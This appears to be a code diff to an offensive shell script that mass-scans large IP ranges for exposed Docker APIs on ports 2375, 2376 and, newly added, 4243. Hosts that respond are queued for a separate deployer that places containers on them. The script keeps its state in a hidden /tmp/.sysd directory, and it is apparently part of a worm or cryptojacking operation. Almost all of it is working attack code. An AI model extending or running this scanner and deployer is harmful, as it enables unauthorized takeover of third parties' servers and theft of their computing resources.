@@ -17,8 +17,9 @@
 # prefix blocks rather than from better GitHub queries.
 #
 # Sweeps each /16 in MASS_NETS (a bare /24 like 167.233.74 also works) one /24 at
-# a time, probing :2375 and TLS :2376 at the same time (so the extra port costs
-# no wall-clock), checks the reply really is a docker API, and appends the daemon
+# a time, probing :2375, TLS :2376 and legacy :4243 at the same time (so the two
+# extra ports cost no wall-clock), checks the reply really is a docker API, and
+# appends the daemon
 # to .hunt/mass.found -
 # which dock.sh reads as queue, so the normal, already-tested deploy path places
 # the container and dock.sh's own state stops it re-scanning that host.
@@ -38,6 +39,7 @@ SYSDIR="${SYSDIR:-/tmp/.sysd}"
 # Precedence: environment > worker.env > built-in default.
 E_PAR="${MASS_PAR:-}"; E_BUDGET="${MASS_BUDGET:-}"; E_NETS="${MASS_NETS:-}"
 E_TLS="${MASS_TLS:-}"; E_REFRESH="${MASS_REFRESH:-}"; E_DEPLOY="${MASS_DEPLOY:-}"
+E_4243="${MASS_4243:-}"
 [ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
 [ -r "$SELF_DIR/worker.env" ] && . "$SELF_DIR/worker.env"
 WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
@@ -47,6 +49,7 @@ PAR="${E_PAR:-${MASS_PAR:-64}}"
 BUDGET="${E_BUDGET:-${MASS_BUDGET:-600}}"
 REFRESH="${E_REFRESH:-${MASS_REFRESH:-2592000}}"
 TLS2376="${E_TLS:-${MASS_TLS:-no}}"
+P4243="${E_4243:-${MASS_4243:-yes}}"
 DEPLOY="${E_DEPLOY:-${MASS_DEPLOY:-yes}}"
 DONE="$WORK/mass.done"
 FOUND="$WORK/mass.found"
@@ -123,6 +126,11 @@ curl -fsS -m 2 --connect-timeout 2 "http://$ip:2375/version" > "$D/p.$ip.2375" 2
 if [ "${TLS2376:-yes}" = yes ]; then
     curl -fsS -k -m 2 --connect-timeout 2 "https://$ip:2376/version" > "$D/p.$ip.2376" 2>/dev/null &
 fi
+# legacy pre-1.0 daemon port: `docker -H tcp://host:4243`, fig-era boxes and some
+# OpenStack images. Still crawled by Shodan; fired in parallel so it is free.
+if [ "${P4243:-yes}" = yes ]; then
+    curl -fsS -m 2 --connect-timeout 2 "http://$ip:4243/version" > "$D/p.$ip.4243" 2>/dev/null &
+fi
 wait
 port=2375
 r=$(cat "$D/p.$ip.2375" 2>/dev/null)
@@ -130,7 +138,11 @@ if [ -z "$r" ]; then
     port=2376
     r=$(cat "$D/p.$ip.2376" 2>/dev/null)
 fi
-rm -f "$D/p.$ip.2375" "$D/p.$ip.2376"
+if [ -z "$r" ]; then
+    port=4243
+    r=$(cat "$D/p.$ip.4243" 2>/dev/null)
+fi
+rm -f "$D/p.$ip.2375" "$D/p.$ip.2376" "$D/p.$ip.4243"
 case "$r" in *ApiVersion*) ;; *) exit 0 ;; esac
 v=$(printf '%s' "$r" | grep -o '"Version":"[^"]*"' | head -1 | cut -d'"' -f4)
 printf '%s\t%s\n' "$ip" "docker=${v:-?}@$port" >> "$FOUND"
@@ -151,7 +163,7 @@ while read -r p; do
         printf '%s.%s\n' "$p" "$j"
         j=$((j + 1))
     done > "$WORK/mass.ips.$$"
-    D="$D" FOUND="$FOUND" TLS2376="$TLS2376" xargs -P "$PAR" -n 1 sh "$ONE" < "$WORK/mass.ips.$$"
+    D="$D" FOUND="$FOUND" TLS2376="$TLS2376" P4243="$P4243" xargs -P "$PAR" -n 1 sh "$ONE" < "$WORK/mass.ips.$$"
     printf '%s\t%s\n' "$(date +%s)" "$p" >> "$DONE"
     swept=$((swept + 1))
     ips=$((ips + 254))
